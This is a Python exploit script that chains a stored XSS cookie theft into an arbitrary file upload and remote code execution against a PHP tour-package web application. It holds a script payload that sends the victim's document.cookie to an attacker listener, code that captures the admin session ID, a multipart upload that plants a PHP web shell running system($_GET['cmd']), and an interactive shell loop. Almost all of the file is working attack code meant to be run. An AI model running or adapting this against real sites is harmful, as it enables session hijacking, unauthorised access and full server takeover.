#!/usr/bin/python3
# Author : twseptian

import requests
import sys
import os
import urllib
import re
import socket
from random import randint
import datetime
import argparse

requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> XSS Stealing Cookies and Arbitary File Upload to RCE')
        print('    >> by twseptian\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}âœ“{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'} #proxies
port = randint(5000,9000) #port
attacker_ip = "127.0.0.1" #attacker ip

def authentication(username,password):
	global session
	global cookies
	session = requests.Session()
	data = { 
        "username" : username, 
        "password" : password,
        "signin" : "SIGNIN"
        }
	try:
		response = session.post(target_ip,data=data,verify=False, proxies=proxies)
		output.success("Logged in successfully")
		cookies = response.cookies.get_dict()
	except requests.HTTPError as exception:
		output.error("HTTP Error : {}".format(exception))
		sys.exit(1)

def servers(port):
    HOST = ''
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((HOST,port))
        s.listen(1)
        conn, addr = s.accept()
        with conn:
            m=conn.recv(2048)
            output.info("XSS triggered capturing cookies to login")
            out=re.findall("PHPSESSID\%3D.*HTTP", m.decode('utf-8'))
            out=out[0].replace("PHPSESSID%3D","").replace("HTTP","")
            return (out.replace("\n","").replace("\t",""))

def send_message(attacker_ip, port):
    global cookie_victim
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate", 
        "Content-Type": "application/x-www-form-urlencoded", "Connection": "close",
        "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", 
        "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"
        }
    url = target_ip+"/enquiry.php"
    xss_payload = "<script>document.location='http://{}:{}/' +escape(document.cookie)</script>".format(attacker_ip,port)
    data_input = {"fname": "xss", "email": xss_payload, "mobileno": "12345678", "subject": "test", "description": "test", "submit1": ''}
    output.info("Sending xss vector via enquires")
    send_data = session.post(url,cookies=cookies, proxies=proxies,data=data_input)
    if send_data.status_code == 200:
        output.success("XSS payload sent successfull")
        cookie_victim=servers(port)
        output.success("Grab victim's PHPSESSID: {}".format(cookie_victim))
    else:
        output.error("XSS payload, failed")
        exit()

def create_phpshell():
    cookie = "PHPSESSID={}".format(cookie_victim)
    headers_victim = { 
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0", 
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
        "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate",  
        "Content-Type": "multipart/form-data; boundary=---------------------------17732522152309426489507213157",
        "Cookie": cookie,
        "Upgrade-Insecure-Requests": "1", "Sec-Fetch-Dest": "document", "Sec-Fetch-Mode": "navigate", 
        "Sec-Fetch-Site": "same-origin", "Sec-Fetch-User": "?1"}
    data_package = "-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"packagename\"\r\n\r\ntest123\r\n-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"packagetype\"\r\n\r\ntest123\r\n-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"packagelocation\"\r\n\r\ntest\r\n-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"packageprice\"\r\n\r\n1234\r\n-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"packagefeatures\"\r\n\r\nasdasd\r\n-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"packagedetails\"\r\n\r\nasdasd\r\n-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"packageimage\"; filename=\"sh3llll.php\"\r\nContent-Type: application/x-php\r\n\r\n<?php system($_GET['cmd']);?>\n\r\n-----------------------------17732522152309426489507213157\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\n\r\n-----------------------------17732522152309426489507213157--\r\n"
    return headers_victim,data_package

def upload_shell(target_ip):
    headers_victim,data_package = create_phpshell()
    output.info("Uploading PHP Shell For RCE...")
    upload = session.post(target_ip+'/admin/create-package.php', headers=headers_victim, data=data_package, proxies=proxies)
    shell_upload = True if("1" in upload.text) else False
    if shell_upload:
        output.success("PHP Shell has been uploaded successfully!")
    else:
        output.error("Failed To Upload The PHP Shell!")

def webshell(target_ip):
    try:
        WEB_SHELL = target_ip+'/admin/pacakgeimages/sh3llll.php'
        getdir = {'cmd': 'echo CMD'}
        r2 = requests.get(WEB_SHELL, params=getdir, verify=False, proxies=proxies)
        status = r2.status_code
        if status != 200:
            output.error("Couldn't connect to the webshell")
            r2.raise_for_status()
        output.success("Successfully connected to webshell.")
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = "\033[91m"+cwd[0]+"\033[0m> "
        term = cwd
        while True:
            thought = input(term)
            command = {'cmd': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\n"); output.warning("Existing.")
        sys.exit(-1)
    
def get_args():
    parser = argparse.ArgumentParser(description='XSS Stealing Cookies and Arbitary File Upload to RCE')
    parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target')
    parser.add_argument('-u', '--username', dest="username", required=True, action='store', help='Username target')
    parser.add_argument('-p', '--password', dest="password", required=True, action='store', help='Password target')
    args = parser.parse_args()
    return args
try:
    args = get_args()
    target_ip = args.url
    username = args.username
    password = args.password

    authentication(username,password)
    send_message(attacker_ip,port)
    upload_shell(target_ip)
    webshell(target_ip)

except KeyboardInterrupt:
    pass

